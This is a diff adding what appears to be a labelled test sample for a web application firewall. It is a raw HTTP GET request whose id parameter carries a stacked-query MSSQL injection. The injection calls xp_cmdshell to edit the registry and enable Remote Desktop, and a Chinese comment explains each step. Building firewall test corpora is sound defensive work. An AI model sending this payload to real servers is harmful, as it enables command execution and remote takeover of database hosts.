@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506398
+# 攻击者基于堆叠查询，将"exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'"语句注入到 SQL 查询参数中，通过存储过程master..xp_cmdshell执行cmd系统命令。
+GET /?id=1%3Bexec%20xp_cmdshell%20%27REG%20ADD%20HKLM%5CSYSTEM%5CCurrentControlSet%5CControl%5CTerminal%22%20%22Server%20%2Fv%20fDenyTSConnections%20%2Ft%20REG_DWORD%20%2Fd%2000000000%20%2Ff%27&bid=hd_tag_m8mv23vy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23vy
+RM-PRO-Token: 9f43414d9447228ecc6af92510e7ccc6
+RM-PRO-Time: 1742808348334
+User-Agent: curl/7.83.1
+
